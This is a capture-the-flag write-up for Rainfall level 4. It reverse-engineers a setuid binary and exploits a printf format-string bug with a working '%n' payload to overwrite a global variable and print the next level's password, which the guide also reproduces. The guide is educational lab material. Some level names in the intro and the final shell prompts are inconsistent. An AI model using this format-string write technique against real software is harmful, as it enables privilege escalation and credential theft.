# Rainfall Level 4 Guide
This guide will walk you through the process of finding the password for the `level3` user.

## 1. Examine your environment
   
`id` : Shows user and group identities that you have.
```bash
uid=2025(level4) gid=2025(level4) groups=2025(level4),100(users)
```
`pwd` : Displays the current directory you are in.
```bash
/home/user/level4
```
`ls -la` : Lists files and their permissions in the current directory.
```bash
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
```

We can see that the `level4` binary has the `setuid` bit set, which means that it runs with the permissions of the owner of the file. In this case, the owner is `level5`. It executable by the `users` group, our current group.

We execute the binary to see what it does. It waiting for an input, print it after pressing enter, and quit.

```bash
level4@RainFall:~$ ./level4
test
test
level4@RainFall:~$ ./level4
abc
abc
```

## 2. Reverse engineering

We will use Ghidra to reverse engineer the binary.
You can find the analysis in [Ressources/ghidra_analyse_level4.c](Ressources/ghidra_analyse_level4.c), and the reconstructed C code in [source.c](source.c).

## 3. Analysis

We find a main function that calls a function `n()`.
```c
int	n(void)
{
	char	local_20c[512];

	fgets(local_20c, 512, stdin);
	p(local_20c);
	if (m == 16930116)
		system("/bin/cat /home/user/level5/.pass");
	return(0);
}
```
The `n()` function reads a line from `stdin` into the buffer `local_20c` with `fgets()`.
The buffer 'local_20c' has a size of 512 bytes.
After reading the input, it calls the function `p()` with the buffer as an argument. The `p()` function prints the buffer with `printf()`.
After that, it checks if the variable `m` is equal to `16930116`. If it is, it will execute the command `system("/bin/cat /home/user/level5/.pass")`.
The variable `m` is a global variable that is set to `0` at the beginning of the program.

## 4. Find the address of the `m` variable

We will use GDB to find the address of the `m` variable.
```bash
gdb ./level4
```
```bash
(gdb) break main
Breakpoint 1 at 0x80484aa
(gdb) run
Starting program: /home/user/level4/level4 

Breakpoint 1, 0x080484aa in main ()
(gdb) info variables
All defined variables:

Non-debugging symbols:
...
0x0804980c  dtor_idx.6161
0x08049810  m
0xb7ffeca0  _rtld_global_ro
...
```
The address of the `m` variable is `0x08049810`.

## 5. Exploitation

We will use the `printf()` function to write the value `16930116` to the address of the `m` variable.
You can find more information about the `printf()` function in the [Vulnerabilities found in Rainfall](../README.md#printf) section.

### 5.1 Find the position of the input on the stack

We will identify the position of our input on the stack by using the `%x` format specifier.
```bash
python -c 'print "aaaa" + " %x" * 10' > /tmp/exploit
cat /tmp/exploit | ./level4
```
Return:
```bash
aaaa b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0
```
`aaaa` is the string "aaaa". `aaaa` is `61616161` in hexadecimal. We don't see `61616161` in the return. So we will increase the number of `%x` to find the position of our input.
```bash
python -c 'print "aaaa" + " %x" * 15' > /tmp/exploit
cat /tmp/exploit | ./level4
```
Return:
```bash
aaaa b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078
```
We can see that `61616161` is at the 12th position on the stack. So when we use our binary using `printf`, we can write to the 12th argument on the stack.

### 5.2 Write the `m` address to the 12th argument

We will write the address of the `m` variable to the 12th argument on the stack.
The address of the `m` variable is `0x08049810` (`\x10\x98\x04\x08` in little-endian).
```bash
python -c 'print "\x10\x98\x04\x08" + " %x" * 15' > /tmp/exploit
cat /tmp/exploit | ./level4
```
Return:
```bash
b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 8049810 20782520 25207825 78252078
```
We can see that the address `0x08049810` is at the 12th position on the stack.

### 5.3 Write the value `16930116` to the address of the `m` variable

We will used the `%n` format specifier to write the number of characters written by `printf()` to the address `0x08049810`, pointed by the 12th argument. We want to write the value `16930116`. So we will write `16930116` characters before the `%n` format specifier. "\x10\x98\x04\x08" has 4 characters. So we will write `16930112` additionnals characters.

We will used the `%d` format specifier to print the decimal value of the argument. `%200d` is used to print a decimal value with a width of 200 characters. We will write `16930112` characters before the `%n` format specifier. So we will use `%16930112d`.

`%12$n` allow to write the number of characters written by `printf()` to the address pointed by the 12th argument.

```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit
cat /tmp/exploit | ./level4
```
This displays lots of spaces, because `%XXd` print `XX` spaces. After displaying the spaces, the program checks the value of `m`. Now, the value of `m` is `16930116`.
So the program executes the command `system("/bin/cat /home/user/level5/.pass")`.

At the end of the execution, we can see the password for the `level5` user.

```bash
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

Congratulations!
We can now connect to the `level5` user with this password.
```bash
level2@RainFall:~$ su level5
Password:
level3@RainFall:~$
```